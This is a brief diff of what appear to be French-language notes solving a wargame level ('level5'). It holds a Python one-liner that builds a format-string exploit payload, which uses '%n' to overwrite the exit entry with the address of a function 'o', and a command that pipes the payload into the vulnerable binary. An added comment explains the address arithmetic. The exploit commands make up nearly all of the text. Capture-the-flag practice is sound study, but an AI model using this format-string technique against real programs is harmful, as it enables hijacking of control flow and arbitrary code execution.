@@ -10,4 +10,6 @@ c la  4 eme
 
 python -c "print '\x38\x98\x04\x08' + '%134513824x%4\$n'" > /tmp/payload5
 
+134513824 car on enleve 4 bytes a la decimal de l adresse de o pour exit
+
 cat /tmp/payload5 - | ./level5
